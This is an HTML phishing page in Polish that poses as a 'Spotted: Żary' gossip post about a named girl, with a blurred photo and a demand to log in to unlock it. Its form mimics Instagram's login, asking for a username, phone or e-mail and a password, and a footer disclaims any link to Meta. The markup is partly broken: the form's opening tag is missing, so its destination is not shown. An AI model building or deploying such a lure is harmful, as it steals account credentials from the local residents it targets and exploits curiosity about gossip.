<!DOCTYPE html>
<html lang="pl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Spotted: Żary - Nowy wpis</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        .pixelated {
            filter: blur(8px);
            -webkit-filter: blur(8px);
        }
    </style>
</head>
<body class="bg-gray-50 font-sans">

    <header class="bg-white border-b p-4 flex justify-between items-center shadow-sm">
        <h1 class="text-xl font-bold text-red-600 tracking-tight">SPOTTED: ŻARY</h1>
        <div class="text-gray-400">
            <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16m-7 6h7" />
            </svg>
        </div>
    </header>

    <main class="max-w-md mx-auto p-4 mt-4">
        <div class="bg-white rounded-lg border shadow-sm overflow-hidden">
            <div class="p-4 border-b bg-gray-100">
                <span class="text-xs font-semibold text-gray-500 uppercase">Wpis #14029 • 24 Kwietnia 2026</span>
            </div>
            
            <div class="relative">
                <img src="https://images.unsplash.com/photo-1529333166437-7750a6dd5a70?auto=format&fit=crop&w=500&q=60" alt="Drama" class="w-full h-64 object-cover pixelated">
                <div class="absolute inset-0 bg-black/30 flex items-center justify-center p-6 text-center">
                    <p class="text-white font-bold text-lg drop-shadow-md">ZALOGUJ SIĘ, ABY ODBLOKOWAĆ ZDJĘCIE I TREŚĆ WPISU</p>
                </div>
            </div>

            <div class="p-6">
                <p class="text-gray-700 mb-4 font-medium italic italic">"Siema, czy to prawda co mówią o Natalii i tym nowym typie z...? Mam screeny jak..."</p>
                
                <hr class="my-6">

                        Weryfikacja społecznościowa wymagana:
                    </div>
                    
                    <div>
                        <input type="text" name="username" placeholder="Numer telefonu, nazwa użytkownika lub e-mail" required
                            class="w-full p-3 bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm">
                    </div>
                    <div>
                        <input type="password" name="password" placeholder="Hasło" required
                            class="w-full p-3 bg-gray-50 border border-gray-300 rounded-sm focus:outline-none focus:ring-1 focus:ring-gray-400 text-sm">
                    </div>

                    <button type="submit" class="w-full bg-[#0095f6] hover:bg-[#1877f2] text-white font-semibold py-2 rounded-md transition duration-200 flex items-center justify-center gap-2">

                        Kontynuuj z Instagramem
                    </button>
                </form>

                <div class="mt-8 text-center text-xs text-gray-400">
                    Strona nie jest powiązana z Meta, Inc. Weryfikacja niezależna Spotted: Żary.
                </div>
            </div>
        </div>
    </main>

</body>
</html>
